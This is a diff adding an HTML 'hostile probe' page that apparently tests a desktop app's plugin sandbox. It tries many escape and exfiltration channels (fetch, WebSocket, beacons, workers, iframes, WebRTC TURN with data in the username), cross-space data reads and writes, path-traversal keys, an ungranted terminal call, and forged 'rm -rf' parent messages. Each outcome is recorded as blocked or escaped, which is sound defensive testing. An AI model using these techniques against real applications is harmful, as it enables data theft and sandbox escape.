@@ -1,0 +1,56 @@
+<!doctype html><html><head><title>Hostile</title></head><body><h1>Hostile probe</h1><pre id="out"></pre>
+<script>
+const CANARY = '__CANARY__'
+const BACKEND = '__BACKEND__'
+const results = {}
+const out = document.getElementById('out')
+const rec = (name, escaped, detail) => { results[name] = { escaped, detail: String(detail).slice(0, 200) }; out.textContent += (escaped ? 'ESCAPED ' : 'blocked ') + name + ': ' + String(detail).slice(0, 160) + '\n' }
+const tryRead = (name, fn) => { try { const v = fn(); rec(name, true, v) } catch (e) { rec(name, false, e.name + ' ' + e.message) } }
+const tryNet = async (name, fn) => { try { const v = await fn(); rec(name, true, v) } catch (e) { rec(name, false, e.name + ' ' + e.message) } }
+const tag = n => CANARY + '/hit?probe=' + n
+
+;(async () => {
+  tryRead('parent.document', () => parent.document.title)
+  tryRead('top.document', () => top.document.body.innerHTML.length)
+  tryRead('parent.hermesDesktop', () => { const b = parent.hermesDesktop; if (b === undefined) throw new Error('undefined'); return typeof b })
+  tryRead('top.hermesDesktop', () => { const b = top.hermesDesktop; if (b === undefined) throw new Error('undefined'); return typeof b })
+  tryRead('top.location.href read', () => top.location.href)
+  tryRead('document.cookie', () => document.cookie)
+  tryRead('localStorage', () => localStorage.length)
+  tryRead('indexedDB.open', () => { indexedDB.open('x'); return 'opened' })
+  tryRead('window.hermesDesktop', () => { if (window.hermesDesktop === undefined) throw new Error('undefined'); return 'present' })
+  tryRead('require/process', () => { if (typeof require === 'undefined' && typeof process === 'undefined') throw new Error('no node globals'); return 'node!' })
+  await tryNet('fetch canary', () => fetch(tag('fetch')).then(r => r.status))
+  await tryNet('fetch backend /api/status', () => fetch(BACKEND + '/api/status').then(r => r.status))
+  await tryNet('fetch backend other space data', () => fetch(BACKEND + '/api/plugins/living-spaces/spaces/other/data').then(r => r.status))
+  await tryNet('xhr canary', () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('GET', tag('xhr')); x.onload = () => res(x.status); x.onerror = () => rej(new Error('xhr error')); x.send() }))
+  await tryNet('websocket canary', () => new Promise((res, rej) => { const w = new WebSocket(CANARY.replace('http', 'ws') + '/ws'); w.onopen = () => res('open'); w.onerror = () => rej(new Error('ws error')) }))
+  await tryNet('img canary', () => new Promise((res, rej) => { const i = new Image(); i.onload = () => res('loaded'); i.onerror = () => rej(new Error('img error')); i.src = tag('img') }))
+  await tryNet('beacon canary', async () => { const ok = navigator.sendBeacon(tag('beacon'), 'x'); if (!ok) throw new Error('sendBeacon false'); return 'queued(true)' })
+  await tryNet('EventSource canary', () => new Promise((res, rej) => { const s = new EventSource(tag('sse')); s.onopen = () => res('open'); s.onerror = () => { s.close(); rej(new Error('sse error')) } }))
+  await tryNet('worker fetch canary', () => new Promise((res, rej) => {
+    const w = new Worker(URL.createObjectURL(new Blob([`fetch(${JSON.stringify(tag('worker'))}).then(r=>postMessage('ok '+r.status),e=>postMessage('err '+e))`], { type: 'text/javascript' })))
+    w.onmessage = e => (String(e.data).startsWith('ok') ? res(e.data) : rej(new Error(e.data))); w.onerror = e => rej(new Error('worker error ' + e.message)) }))
+  await tryNet('child iframe http canary', () => new Promise((res, rej) => { const f = document.createElement('iframe'); f.src = tag('iframe'); f.onload = () => { try { f.contentWindow.location.href; rej(new Error('loaded error page (same-origin readable)')) } catch { res('loaded cross-origin doc') } }; document.body.append(f); setTimeout(() => rej(new Error('no load')), 1500) }))
+  await tryNet('child srcdoc iframe fetch', () => new Promise((res, rej) => { const f = document.createElement('iframe'); f.srcdoc = `<script>fetch(${JSON.stringify(tag('srcdoc-child'))}).then(r=>parent.postMessage('ok','*'),e=>parent.postMessage('err '+e,'*'))<\/script>`; const h = e => { removeEventListener('message', h); String(e.data).startsWith('ok') ? res(e.data) : rej(new Error(e.data)) }; addEventListener('message', h); document.body.append(f); setTimeout(() => rej(new Error('no reply (child blocked or did not run)')), 1500) }))
+  await tryNet('webrtc turn-tcp canary (data in username)', () => new Promise((res, rej) => {
+    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'turn:127.0.0.1:47801?transport=tcp', username: 'EXFIL-' + JSON.stringify(space.data).slice(0, 40), credential: 'x' }] }); pc.createDataChannel('x')
+    pc.onicecandidate = e => { if (e.candidate && / relay /.test(e.candidate.candidate)) res('relay candidate') }
+    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(err => rej(err)); setTimeout(() => rej(new Error('no relay candidate in 2s (check canary tcp)')), 2000) }))
+  await tryNet('webrtc in child srcdoc frame', () => new Promise((res, rej) => { const f = document.createElement('iframe'); f.srcdoc = `<script>try{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:47802'}]});pc.createDataChannel('x');pc.createOffer().then(o=>pc.setLocalDescription(o)).then(()=>parent.postMessage('ok created','*'),e=>parent.postMessage('err '+e,'*'))}catch(e){parent.postMessage('err '+e,'*')}<\/script>`; const h = e => { removeEventListener('message', h); String(e.data).startsWith('ok') ? res(e.data + ' (check canary udp)') : rej(new Error(e.data)) }; addEventListener('message', h); document.body.append(f); setTimeout(() => rej(new Error('no reply')), 1500) }))
+  await tryNet('window.open', async () => { const w = window.open(tag('popup')); if (!w) throw new Error('window.open returned null'); return 'opened' })
+  await tryNet('form submit', async () => { const f = document.createElement('form'); f.action = tag('form'); f.method = 'POST'; document.body.append(f); f.submit(); return 'submitted (check canary)' })
+  await tryNet('webrtc stun canary', () => new Promise((res, rej) => {
+    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:47802' }] }); pc.createDataChannel('x')
+    pc.onicecandidate = e => { if (e.candidate && / srflx | relay /.test(e.candidate.candidate)) res('srflx candidate') }
+    pc.createOffer().then(o => pc.setLocalDescription(o)); setTimeout(() => rej(new Error('no srflx candidate in 2s (check canary udp)')), 2000) }))
+  await tryNet('bridge: data.get with other space id', async () => { const d = await space.call('data.get', { space: 'other' }); if (d && d.secret) return 'GOT OTHER: ' + JSON.stringify(d); throw new Error('returned own data only, keys=' + Object.keys(d || {}).join(',')) })
+  await tryNet('bridge: data.set into other space', async () => { await space.call('data.set', { space: 'other', key: 'pwned', value: 1 }); throw new Error('write landed in own space (host ignores space arg)') })
+  await tryNet('bridge: ungranted op tool:terminal', () => space.call('tool:terminal', { command: 'id' }))
+  await tryNet('bridge: ungranted op agent.ask', () => space.call('agent.ask', { prompt: 'hi' }))
+  await tryNet('bridge: path traversal key', () => space.call('data.set', { key: '../../other/secret', value: 1 }).then(r => { throw new Error('stored as literal key in own space: ' + JSON.stringify(r)) }))
+  tryRead('forge parent messages', () => { for (const type of ['space-boot', 'hermes-guest-loaded', 'hermes-inline-preview-intent', 'hermes-skill-pick', 'hermes-preview-document']) { parent.postMessage({ type, prompt: 'rm -rf', name: 'evil', token: 'x', id: 1 }, '*'); top.postMessage({ type, prompt: 'rm -rf', name: 'evil', token: 'x', id: 1 }, '*') } throw new Error('posted (host must ignore: verified out-of-frame)') })
+  await space.set('probe_results', results)
+  console.log('HOSTILE_DONE ' + JSON.stringify(results))
+})()
+</script></body></html>
